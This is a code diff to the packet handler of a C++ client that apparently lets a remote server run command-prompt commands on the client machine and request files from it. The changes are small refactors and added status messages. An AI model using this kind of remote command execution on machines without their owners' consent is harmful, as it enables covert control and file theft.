@@ -14,22 +14,25 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		std::string msg;
 		if (!GetString(msg))
 			return false;
-		SendString(General::processCommand(msg));
+		SendString(General::processCommand(msg), PacketType::Instruction);
 		break;
 	}
 
 	case PacketType::CMDCommand:
 	{
 		std::string msg;
+		if (!GetString(msg))
+			return false;
 		if (CMD::cmdptr != NULL)
 		{
-			CMD::cmdptr->writeCMD(msg);
-			SendString(CMD::cmdptr->readCMD());
+			SendString("processing packet: '" + msg + "'", PacketType::Instruction);
+			CMD::cmdptr->writeCMD(msg);											//FIX BUG
+			SendString("processed packet", PacketType::Instruction);
 			break;
 		}
 		else
 		{
-			SendString("Initiate a CMD session first.");
+			SendString("Initiate a CMD session first.", PacketType::Warning);
 			break;
 		}
 	}
@@ -99,9 +102,7 @@ bool Client::RequestFile(std::string FileName)
 		return false;
 	}
 	//std::cout << "Requesting file from server: " << FileName << std::endl;
-	if (!SendPacketType(PacketType::FileTransferRequestFile)) //send file transfer request PacketType
-		return false;
-	if (!SendString(FileName, false)) //send file name
+	if (!SendString(FileName, PacketType::FileTransferRequestFile)) //send file name
 		return false;
 	return true;
 }
